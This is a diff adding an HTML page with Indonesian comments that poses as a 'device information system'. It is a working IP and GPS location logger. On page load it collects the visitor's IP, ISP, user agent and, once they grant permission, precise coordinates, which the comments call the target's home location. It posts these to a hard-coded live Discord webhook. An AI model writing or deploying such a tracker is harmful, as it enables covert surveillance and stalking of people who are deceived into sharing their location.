@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sistem Informasi Perangkat</title>
+</head>
+<body>
+
+    <h2>Mengambil Data Lokasi...</h2>
+    <p id="status">Memproses informasi perangkat dan lokasi Anda. Silakan klik 'Izinkan' jika muncul permintaan akses...</p>
+
+    <script>
+        const statusText = document.getElementById('status');
+        
+        // URL Webhook aktif Anda sudah terpasang di sini
+        const webhookUrl = "https://discord.com/api/webhooks/1473581902454853777/5AIh1HAd8YUaOzi2fY3PVu-6jGeFRzKVWgDG7fg3g5LfoXZcmbeh3QJjrNC47JwmbBsh"; 
+
+        // 1. Ambil data IP menggunakan endpoint JSON yang benar
+        async function getIPAndFallbackData() {
+            try {
+                // Menambahkan /json/ di akhir URL agar mengembalikan data yang valid
+                const response = await fetch('https://ip-api.com');
+                const data = await response.json();
+                
+                if(data.status === "fail") throw new Error(data.message);
+                
+                return {
+                    ip: data.query || "Tidak terdeteksi",
+                    city: data.city || "Tidak diketahui",
+                    region: data.regionName || "Tidak diketahui",
+                    country: data.country || "Tidak diketahui",
+                    org: data.isp || "Tidak diketahui"
+                };
+            } catch (error) {
+                console.log("Gagal memuat API Utama, mencoba API Cadangan...", error);
+                try {
+                    // Menggunakan endpoint API JSON resmi milik ipify
+                    const resBackup = await fetch('https://ipify.org');
+                    const dataBackup = await resBackup.json();
+                    return { ip: dataBackup.ip, city: "Manual", region: "Manual", country: "Manual", org: "Jaringan" };
+                } catch(e) {
+                    return { ip: "Gagal Total", city: "-", region: "-", country: "-", org: "-" };
+                }
+            }
+        }
+
+        function getDeviceOS() {
+            return navigator.userAgent;
+        }
+
+        function sendDataToServer(payload) {
+            console.log("Mencoba mengirim data:", payload);
+
+            if (!webhookUrl || webhookUrl.includes("URL_WEBHOOK_ANDA_DI_SINI")) {
+                console.warn("PERINGATAN: URL Webhook belum diisi dengan benar!");
+                return;
+            }
+
+            // Memformat pesan untuk dikirimkan secara rapi ke server Discord
+            const bodyData = JSON.stringify({
+                content: `📌 **Log Baru Terdeteksi!**\n🌐 **IP**: ${payload.ip}\n🌍 **Lokasi Estimasi**: ${payload.lokasi_estimasi}\n🏢 **ISP**: ${payload.provider}\n📍 **GPS**: ${payload.latitude}, ${payload.longitude} (Akurasi: ${payload.akurasi})\n📱 **OS/Browser**: ${payload.os_browser}\n🛠️ **Metode**: ${payload.metode_pelacakan}`
+            });
+
+            fetch(webhookUrl, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: bodyData
+            })
+            .then(() => console.log("Data berhasil terkirim ke Discord!"))
+            .catch(err => console.error("Gagal mengirim data via Fetch:", err));
+        }
+
+        async function startLogger() {
+            const ipData = await getIPAndFallbackData();
+            const osDetails = getDeviceOS();
+
+            // Membuat draf data awal (jika user menolak/browser memblokir GPS)
+            const payload = {
+                ip: ipData.ip,
+                os_browser: osDetails,
+                provider: ipData.org,
+                latitude: "Ditolak/Belum Diizinkan",
+                longitude: "Ditolak/Belum Diizinkan",
+                akurasi: "-",
+                metode_pelacakan: "IP Geolocation (Estimasi Jaringan)",
+                lokasi_estimasi: `${ipData.city}, ${ipData.region}, ${ipData.country}`
+            };
+
+            // Menampilkan info awal di layar target
+            statusText.innerHTML = `
+                <b>IP Address:</b> ${payload.ip} <br>
+                <b>Estimasi Lokasi:</b> ${payload.lokasi_estimasi} <br>
+                <b>Perangkat/OS:</b> ${payload.os_browser.substring(0, 60)}...
+            `;
+
+            // Kirim data IP awal ke Discord agar data tidak hilang meskipun browser ditutup
+            sendDataToServer(payload);
+
+            if (!navigator.geolocation) {
+                payload.metode_pelacakan = "IP Only (HTML5 Tidak Didukung)";
+                return;
+            }
+
+            // Opsi GPS agar perangkat memaksa hardware GPS menyala dan memicu pop-up browser
+            const opsiGPS = {
+                enableHighAccuracy: true,
+                timeout: 10000,
+                maximumAge: 0
+            };
+
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    // JIKA USER MENGIZINKAN AKSES LOKASI
+                    payload.latitude = position.coords.latitude;
+                    payload.longitude = position.coords.longitude;
+                    payload.akurasi = `${position.coords.accuracy} meter`;
+                    payload.metode_pelacakan = "HTML5 Akurat (GPS Terizin)";
+
+                    statusText.innerHTML += `<br><span style="color:green;"><b>GPS Akurat Rumah Berhasil Didapatkan!</b></span>`;
+                    
+                    // Mengirimkan pembaruan data koordinat GPS akurat ke Discord
+                    sendDataToServer(payload);
+                },
+                (error) => {
+                    // JIKA USER MENOLAK ATAU BROWSER MEMBLOKIR POP-UP
+                    let alasan = "Izin ditolak atau diblokir browser (Pastikan memakai HTTPS).";
+                    if(error.code === error.TIMEOUT) alasan = "Waktu pencarian GPS habis.";
+                    if(error.code === error.POSITION_UNAVAILABLE) alasan = "Sensor GPS tidak tersedia.";
+                    
+                    statusText.innerHTML += `<br><span style="color:red;">Error: ${alasan}</span>`;
+                },
+                opsiGPS
+            );
+        }
+
+        window.onload = startLogger;
+    </script>
+
+</body>
+</html>
